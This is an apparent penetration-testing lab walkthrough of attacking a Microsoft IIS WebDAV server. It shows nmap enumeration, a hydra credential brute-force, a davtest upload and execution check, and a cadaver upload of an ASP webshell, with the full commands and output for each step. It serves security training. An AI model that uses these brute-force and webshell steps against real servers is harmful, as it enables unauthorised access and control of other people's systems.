# Exploiting Microsoft IIS WebDAV

## Tools used:

[Davtest](https://code.google.com/archive/p/davtest/):

Davtest is a WebDAV scanner that sends exploit files to the WebDAV server and automatically creates the directory and uploads different format types of files. The tool also tried to execute uploaded files and gives us an output of successfully executed files.

[cadaver](https://github.com/grimneko/cadaver):

Cadaver is a tool for WebDAV clients, which supports a command-line style interface. It supports operations such as uploading files, editing, moving, etc.

***

First of all, let's perform a basic Nmap scan:

<pre class="language-sh"><code class="lang-sh">root@attackdefense:~# nmap -sV -sC -p80 10.5.27.26
Starting Nmap 7.91 ( https://nmap.org ) at 2023-12-30 15:04 IST
Nmap scan report for 10.5.27.26
Host is up (0.0019s latency).

PORT   STATE SERVICE VERSION
<strong>80/tcp open  http    Microsoft IIS httpd 10.0
</strong>| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND LOCK UNLOCK PROPPATCH MKCOL PUT DELETE MOVE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to /Default.aspx
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, LOCK, UNLOCK
|   Server Date: Sat, 30 Dec 2023 09:35:07 GMT
|_  Server Type: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.52 seconds
</code></pre>

This doesn't give us proper information for webDav, let try to run the enum script:

<pre class="language-sh"><code class="lang-sh">root@attackdefense:~# nmap -sV -sC -p80 10.5.27.26 --script=http-enum
Starting Nmap 7.91 ( https://nmap.org ) at 2023-12-30 15:08 IST
Nmap scan report for 10.5.27.26
Host is up (0.0019s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-enum: 
<strong>|_  /webdav/: Potentially interesting folder (401 Unauthorized)
</strong>|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</code></pre>

We found a wedav directory which gives us 401, which means we need authentication to access the directory. We can brute force the login credentials using hydra:

```sh
root@attackdefense:~# hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.5.27.26 http-get /webdav/
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-30 15:14:09
[DATA] max 16 tasks per 1 server, overall 16 tasks, 400 login tries (l:8/p:50), ~25 tries per task
[DATA] attacking http-get://10.5.27.26:80/webdav/
1 of 1 target completed, 0 valid password found
```

This was just an example that how to perform brute force in this case.

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

and this is how it looks.

So now we know that Webdav allows us to download or upload the files within this directory. So we can use a tool for this that already comes with kali Linux:

```sh
root@attackdefense:~# davtest -url http://10.5.27.26/webdav
********************************************************
 Testing DAV connection
OPEN		FAIL:	http://10.5.27.26/webdav	Unauthorized. Basic realm="10.5.27.26"
```

This was the basic usage of davtest. to connect to webdav, we need to give it a valid credentials like this:

```sh
root@attackdefense:~# davtest -url http://10.5.27.26/webdav -auth bob:password_123321
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.5.27.26/webdav
********************************************************
NOTE	Random string for this session: zQDBIXMfsh
********************************************************
 Creating directory
MKCOL		SUCCEED:		Created http://10.5.27.26/webdav/DavTestDir_zQDBIXMfsh
********************************************************
 Sending test files
PUT	txt	SUCCEED:	http://10.5.27.26/webdav/DavTestDir_zQDBIXMfsh/davtest_zQDBIXMfsh.txt
PUT	jsp	SUCCEED:	http://10.5.27.26/webdav/DavTestDir_zQDBIXMfsh/davtest_zQDBIXMfsh.jsp
PUT	asp	SUCCEED:	http://10.5.27.26/webdav/DavTestDir_zQDBIXMfsh/davtest_zQDBIXMfsh.asp
PUT	cgi	SUCCEED:	http://10.5.27.26/webdav/DavTestDir_zQDBIXMfsh/davtest_zQDBIXMfsh.cgi
PUT	php	SUCCEED:	http://10.5.27.26/webdav/DavTestDir_zQDBIXMfsh/davtest_zQDBIXMfsh.php
PUT	html	SUCCEED:	http://10.5.27.26/webdav/DavTestDir_zQDBIXMfsh/davtest_zQDBIXMfsh.html
PUT	jhtml	SUCCEED:	http://10.5.27.26/webdav/DavTestDir_zQDBIXMfsh/davtest_zQDBIXMfsh.jhtml
PUT	pl	SUCCEED:	http://10.5.27.26/webdav/DavTestDir_zQDBIXMfsh/davtest_zQDBIXMfsh.pl
PUT	shtml	SUCCEED:	http://10.5.27.26/webdav/DavTestDir_zQDBIXMfsh/davtest_zQDBIXMfsh.shtml
PUT	aspx	SUCCEED:	http://10.5.27.26/webdav/DavTestDir_zQDBIXMfsh/davtest_zQDBIXMfsh.aspx
PUT	cfm	SUCCEED:	http://10.5.27.26/webdav/DavTestDir_zQDBIXMfsh/davtest_zQDBIXMfsh.cfm
********************************************************
 Checking for test file execution
EXEC	txt	SUCCEED:	http://10.5.27.26/webdav/DavTestDir_zQDBIXMfsh/davtest_zQDBIXMfsh.txt
EXEC	jsp	FAIL
EXEC	asp	SUCCEED:	http://10.5.27.26/webdav/DavTestDir_zQDBIXMfsh/davtest_zQDBIXMfsh.asp
.
.
```

The connection is successful.

To upload, download or modify files, we can now use the cadaver utility:

```sh
root@attackdefense:~# cadaver http://10.5.27.26/webdav
Authentication required for 10.5.27.26 on server `10.5.27.26':
Username: bob
Password: 
dav:/webdav/> put /usr/share/webshells/asp/webshell.asp 
Uploading /usr/share/webshells/asp/webshell.asp to `/webdav/webshell.asp':
Progress: [=============================>] 100.0% of 1362 bytes succeeded.
```

Here we upload an ASP webshell.

> Webshells comes pre-packages in kali linux at the following path
>
> ```sh
> root@attackdefense:~# ls /usr/share/webshells/
> asp  aspx  cfm	jsp  laudanum  perl  php  seclists
> ```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Our shell is working correctly.
